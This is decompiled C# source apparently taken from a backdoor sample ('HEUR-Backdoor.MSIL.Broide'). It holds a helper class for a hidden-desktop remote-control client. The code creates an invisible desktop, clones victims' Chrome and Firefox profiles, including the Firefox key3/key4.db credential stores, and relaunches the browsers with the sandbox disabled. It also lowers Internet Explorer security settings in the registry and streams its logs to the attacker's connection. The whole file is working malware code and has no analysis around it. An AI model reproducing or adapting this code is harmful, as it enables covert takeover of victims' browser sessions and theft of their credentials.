// Decompiled with JetBrains decompiler
// Type: RemoteClient.Helpers
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using fdghdfghdfg;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace RemoteClient
{
  internal class Helpers
  {
    private static int chromeSize;
    private static int i;
    private static int copied;

    public static string GetOSName()
    {
      string input = "Unknown OS";
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            input = enumerator.Current["Caption"].ToString();
        }
      }
      return string.Format("{0} {1} Bit", (object) Regex.Replace(input, "^.*(?=Windows)", "").TrimEnd().TrimStart(), (object) 64);
    }

    private byte[] SeparateAndGetLast(byte[] Param_59, byte[] Param_60)
    {
      for (int index = 0; index < Param_59.Length; ++index)
      {
        if (Helpers.Equals(Param_59, Param_60, index))
        {
          int sourceIndex = index + Param_60.Length;
          byte[] destinationArray = new byte[Param_59.Length - sourceIndex];
          Array.Copy((Array) Param_59, sourceIndex, (Array) destinationArray, 0, destinationArray.Length);
          return destinationArray;
        }
      }
      throw new Exception("not found");
    }

    public static List<byte[]> Separate(byte[] Param_61, byte[] Param_62)
    {
      List<byte[]> numArrayList = new List<byte[]>();
      int sourceIndex = 0;
      for (int index = 0; index < Param_61.Length; ++index)
      {
        if (Helpers.Equals(Param_61, Param_62, index))
        {
          byte[] destinationArray = new byte[index - sourceIndex];
          Array.Copy((Array) Param_61, sourceIndex, (Array) destinationArray, 0, destinationArray.Length);
          numArrayList.Add(destinationArray);
          sourceIndex = index + Param_62.Length;
          index += Param_62.Length - 1;
        }
      }
      byte[] destinationArray1 = new byte[Param_61.Length - sourceIndex];
      Array.Copy((Array) Param_61, sourceIndex, (Array) destinationArray1, 0, destinationArray1.Length);
      numArrayList.Add(destinationArray1);
      return numArrayList;
    }

    private static bool Equals(byte[] Param_63, byte[] Param_64, int Param_65)
    {
      bool flag;
      for (int index = 0; index < Param_64.Length; ++index)
      {
        if ((Param_65 + index >= Param_63.Length ? 1 : ((int) Param_63[Param_65 + index] != (int) Param_64[index] ? 1 : 0)) != 0)
        {
          flag = false;
          goto label_6;
        }
      }
      flag = true;
label_6:
      return flag;
    }

    public static void InitHDesktop()
    {
      Streaming.defaultDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadID());
      Streaming.Hdsktp = Native.OpenDesktop("sdfsddfg", 0, true, 511U);
      if (Streaming.Hdsktp == IntPtr.Zero)
        Streaming.Hdsktp = Native.CreateDesktop("sdfsddfg", (string) null, IntPtr.Zero, 0U, 511U, IntPtr.Zero);
      Streaming.ActiveDesktop = Streaming.Hdsktp;
      Native.SetThreatDesktop(Streaming.Hdsktp);
      bool flag = false;
      foreach (Process process in Process.GetProcessesByName("explorer"))
      {
        if (process.MainWindowHandle != IntPtr.Zero)
          flag = true;
      }
      if (flag)
        return;
      try
      {
        RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
        string str = (string) registryKey1.GetValue("WallPaper");
        registryKey1.SetValue("WallPaper", (object) "");
        registryKey1.Close();
        Native.smethod_48("C:\\Windows\\explorer.exe", "/separate");
        Thread.Sleep(500);
        RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
        registryKey2.SetValue("WallPaper", (object) str);
        registryKey2.Close();
      }
      catch (Exception ex)
      {
        Helpers.BrowserLogging(ex.ToString());
      }
    }

    public static void InitBrowser(object browser)
    {
      Helpers.chromeSize = 0;
      Helpers.i = 0;
      Helpers.copied = 0;
      switch ((byte) browser)
      {
        case 0:
          Helpers.Chrome((int) (byte) browser);
          break;
        case 1:
          Helpers.Chrome((int) (byte) browser);
          break;
        case 2:
          Helpers.Firefox((int) (byte) browser);
          break;
        case 3:
          Helpers.Firefox((int) (byte) browser);
          break;
        case 4:
          Helpers.IE();
          break;
        case 5:
          try
          {
            vars.KillBrowsers("chrome");
            WindowsUtility.CreateProcess(new ProcessStartInfo()
            {
              FileName = "cmd.exe",
              Arguments = "/C start chrome.exe",
              WorkingDirectory = "."
            }, "sdfsddfg");
            break;
          }
          catch
          {
            break;
          }
        case 19:
          Config.retip = "";
          Connection.RemoteClient_2.Dispose();
          break;
      }
    }

    private static void Chrome(int Param_67)
    {
      try
      {
        string path1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default";
        string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf\\Default";
        if ((!Directory.Exists(path2) ? 1 : (Param_67 == 0 ? 1 : 0)) != 0)
        {
          bool flag = false;
          foreach (string logicalDrive in Environment.GetLogicalDrives())
          {
            Helpers.BrowserLogging("Check drive " + logicalDrive + "for space");
            DriveInfo driveInfo = new DriveInfo(logicalDrive);
            if ((!driveInfo.IsReady || driveInfo.DriveType != DriveType.Fixed ? 0 : (Helpers.EnoughSpace(Directory.GetFiles(path1, "*.*", SearchOption.AllDirectories), driveInfo) ? 1 : 0)) == 0)
            {
              Helpers.BrowserLogging("Not enought space on " + logicalDrive + " to copy profile");
            }
            else
            {
              flag = true;
              Helpers.BrowserLogging("Got disk for copy");
              path2 = path2.Remove(0, 3).Insert(0, driveInfo.Name);
              break;
            }
          }
          if (!flag)
          {
            Helpers.BrowserLogging("Not enought space on disks to copy profile");
            return;
          }
        }
        string str1 = "/C start chrome.exe --disable-3d-apis --disable-gpu-rasterization --disable-gpu-vsync --disable-gpu-program-cache --disable-gpu --disable-d3d11 --disable-flash-3d --no-sandbox --user-data-dir=\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf\"";
        string str2 = "C:\\Windows\\System32\\cmd.exe";
        if (!File.Exists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"))
        {
          if (File.Exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
          {
            str1 = "--disable-3d-apis --disable-gpu-rasterization --disable-gpu-vsync --disable-gpu-program-cache --disable-gpu --disable-d3d11 --disable-flash-3d --no-sandbox --user-data-dir=\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf\"";
            str2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
            Helpers.BrowserLogging(str2);
          }
          else if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\Application\\chrome.exe"))
          {
            Helpers.BrowserLogging("Chrome will start with cmd");
          }
          else
          {
            str1 = "--disable-3d-apis --disable-gpu-rasterization --disable-gpu-vsync --disable-gpu-program-cache --disable-gpu --disable-d3d11 --disable-flash-3d --no-sandbox --user-data-dir=\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf\"";
            str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\Application\\chrome.exe";
            Helpers.BrowserLogging(str2);
          }
        }
        else
        {
          str1 = "--disable-3d-apis --disable-gpu-rasterization --disable-gpu-vsync --disable-gpu-program-cache --disable-gpu --disable-d3d11 --disable-flash-3d --no-sandbox --user-data-dir=\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf\"";
          str2 = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
          Helpers.BrowserLogging(str2);
        }
        if (!Directory.Exists(path2) || Param_67 == 0)
        {
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf");
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\copiedProf\\Default");
          Helpers.BrowserLogging("direcories created");
          Helpers.CloneDirectory(path1, path2);
        }
        Helpers.BrowserLogging("Executing chrome");
        int num = Native.smethod_48(str2, str1);
        Thread.Sleep(1000);
        if (num == 1)
          Helpers.BrowserLogging("Succes Chrome");
        else
          Helpers.BrowserLogging("executing error code: " + num.ToString());
      }
      catch (Exception ex)
      {
        Helpers.BrowserLogging(ex.Message);
      }
    }

    private static void Firefox(int Param_68)
    {
      try
      {
        string path1 = "";
        string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\";
        string str1 = File.ReadAllText(path2 + "profiles.ini");
        bool flag1 = false;
        Helpers.BrowserLogging("loking for relative profile");
        while (!flag1)
        {
          str1 = str1.Substring(str1.IndexOf("IsRelative=") + "IsRelative=".Length);
          if (str1 != null)
          {
            if (str1[0] == '1')
            {
              string str2 = str1.Substring(str1.IndexOf("Path=") + "Path=".Length);
              int length = str2.IndexOf("\r\n");
              string str3 = str2.Substring(0, length).Replace("/", "\\");
              if ((!File.Exists(path2 + str3 + "\\prefs.js") ? 0 : (!File.Exists(path2 + str3 + "\\key3.db") ? (File.Exists(path2 + str3 + "\\key4.db") ? 1 : 0) : 1)) != 0)
              {
                path2 += str3;
                flag1 = true;
              }
            }
          }
          else
          {
            Helpers.BrowserLogging("no relative profile found");
            return;
          }
        }
        bool flag2 = false;
        foreach (string logicalDrive in Environment.GetLogicalDrives())
        {
          DriveInfo driveInfo = new DriveInfo(logicalDrive);
          if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Fixed && Helpers.EnoughSpace(Directory.GetFiles(path2, "*.*", SearchOption.AllDirectories), driveInfo))
          {
            Helpers.BrowserLogging("Got drive to copy");
            path1 = path2.Remove(0, 3).Insert(0, driveInfo.Name) + "C";
            flag2 = true;
            break;
          }
        }
        if (flag2)
        {
          if (!Directory.Exists(path1) || Param_68 == 3)
            Helpers.CloneDirectory(path2, path1);
          Helpers.ConfigFF(path1);
          string str4 = "/C start Firefox -no-remote -profile \"" + path1 + "\"";
          string str5 = "C:\\Windows\\System32\\cmd.exe";
          if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
          {
            str4 = "-no-remote -profile \"" + path1 + "\"";
            str5 = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
          }
          Helpers.BrowserLogging(str5);
          int num = Native.smethod_48(str5, str4);
          Thread.Sleep(1000);
          if (num != 1)
            Helpers.BrowserLogging("executing error code: " + num.ToString());
          else
            Helpers.BrowserLogging("Succes FF");
        }
        else
          Helpers.BrowserLogging("Not enought space on disk to copy profile");
      }
      catch (Exception ex)
      {
        Helpers.BrowserLogging(ex.Message);
      }
    }

    private static void ConfigFF(string Param_69)
    {
      bool flag1 = false;
      bool flag2 = false;
      string[] collection = new string[3]
      {
        "user_pref(\"layers.geometry.d3d11.enabled\", false);",
        "user_pref(\"layers.acceleration.disabled\", true);",
        "user_pref(\"media.wmf.dxva.d3d11.enabled\", false);"
      };
      List<string> list = ((IEnumerable<string>) File.ReadAllLines(Param_69 + "\\prefs.js")).ToList<string>();
      for (int index = 0; index < list.Count; ++index)
      {
        if ((!list[index].Contains("user_pref") ? 0 : (!flag1 ? 1 : 0)) != 0)
        {
          list.InsertRange(index + 1, (IEnumerable<string>) collection);
          flag1 = true;
        }
        if (list[index].Contains("user_pref(\"browser.shell.checkDefaultBrowser\""))
        {
          list[index] = "user_pref(\"browser.shell.checkDefaultBrowser\", false);";
          flag2 = true;
          break;
        }
      }
      if (!flag2)
        list.Add("user_pref(\"browser.shell.checkDefaultBrowser\", false);");
      string str = File.ReadAllText(Param_69 + "\\xulstore.json");
      File.WriteAllText(Param_69 + "\\xulstore.json", str.Replace("normal", "maximized"));
      File.WriteAllLines(Param_69 + "\\prefs.js", list.ToArray());
    }

    private static void IE()
    {
      try
      {
        Helpers.BrowserLogging("Disabling IE protection");
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "2500", (object) 3, RegistryValueKind.DWord);
        int num = Native.smethod_48("C:\\Windows\\System32\\cmd.exe", "/C start iexplore.exe -extoff -nomerge -noframemerging");
        Thread.Sleep(1000);
        if (num == 1)
          Helpers.BrowserLogging("Succes IE");
        else
          Helpers.BrowserLogging("executing error code: " + num.ToString());
      }
      catch (Exception ex)
      {
        Helpers.BrowserLogging(ex.Message);
      }
    }

    private static bool EnoughSpace(string[] Param_70, DriveInfo Param_71)
    {
      int num = 0;
      Helpers.BrowserLogging("Begin calculating size for drive " + Param_71.VolumeLabel);
      foreach (string fileName in Param_70)
      {
        try
        {
          num += (int) new FileInfo(fileName).Length;
        }
        catch
        {
        }
      }
      Helpers.chromeSize = num / 1024 / 1024;
      return (long) num < Param_71.AvailableFreeSpace;
    }

    private static void CloneDirectory(string Param_72, string Param_73)
    {
      try
      {
        foreach (string directory in Directory.GetDirectories(Param_72))
        {
          if ((directory == Param_73 ? 0 : (!(directory.Substring(1, directory.Length - 1) == Param_73.Substring(1, Param_73.Length - 1)) ? 1 : 0)) != 0)
          {
            string fileName = Path.GetFileName(directory);
            if (!Directory.Exists(Path.Combine(Param_73, fileName)))
              Directory.CreateDirectory(Path.Combine(Param_73, fileName));
            Helpers.CloneDirectory(directory, Path.Combine(Param_73, fileName));
          }
        }
        foreach (string file in Directory.GetFiles(Param_72))
        {
          try
          {
            File.Copy(file, Path.Combine(Param_73, Path.GetFileName(file)), true);
            Helpers.copied += (int) new FileInfo(Path.Combine(Param_73, Path.GetFileName(file))).Length;
            if (Helpers.i == 10)
            {
              Helpers.BrowserLogging("Copied " + (object) (Helpers.copied / 1024 / 1024) + " of " + (object) Helpers.chromeSize);
              Helpers.i = 0;
            }
            else
              ++Helpers.i;
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    public static Size GetScreenResolution()
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Helpers.Class11 class11 = new Helpers.Class11();
      // ISSUE: reference to a compiler-generated field
      class11.int_28 = 0;
      // ISSUE: reference to a compiler-generated field
      class11.int_29 = 0;
      try
      {
        // ISSUE: reference to a compiler-generated method
        Native.EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, new Native.Class28(class11.method_39), IntPtr.Zero);
      }
      catch
      {
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      return (class11.int_28 != 0 ? (class11.int_29 == 0 ? 1 : 0) : 1) == 0 ? new Size(class11.int_28, class11.int_29) : new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
    }

    private static Size GetNonWhite(
      Bitmap Param_74,
      int Param_75,
      int Param_76,
      int Param_77,
      int Param_78,
      bool Param_79)
    {
      Size nonWhite;
      if (!Param_79)
      {
        int height = 0;
        for (int x = Param_77; x > 0; x -= 800)
        {
          for (int y = Param_76; y > 0; --y)
          {
            System.Drawing.Color color = Param_74.GetPixel(x, y);
            int argb1 = color.ToArgb();
            color = System.Drawing.Color.White;
            int argb2 = color.ToArgb();
            if (argb1 != argb2)
            {
              if (y > height)
              {
                height = y;
                break;
              }
              break;
            }
          }
        }
        nonWhite = new Size(Param_77, height);
      }
      else
      {
        for (int x = Param_77; x > 0; --x)
        {
          System.Drawing.Color color = Param_74.GetPixel(x, Param_78);
          int argb3 = color.ToArgb();
          color = System.Drawing.Color.White;
          int argb4 = color.ToArgb();
          if (argb3 != argb4)
          {
            Param_77 = x;
            Bitmap bitmap = Param_74.Clone(new Rectangle(0, 0, Param_77, Param_76), PixelFormat.Format24bppRgb);
            Param_74.Dispose();
            Param_74 = (Bitmap) null;
            nonWhite = Helpers.GetNonWhite(bitmap, Param_77 - 1, Param_76 - 1, Param_77 - 1, Param_78 - 1, false);
            goto label_17;
          }
        }
        nonWhite = Size.Empty;
      }
label_17:
      return nonWhite;
    }

    public static void BrowserLogging(string Param_80) => new RemoteClient.Packets.Client.Packets.Log(Param_80).Execute(Connection.RemoteClient_2);
  }
}
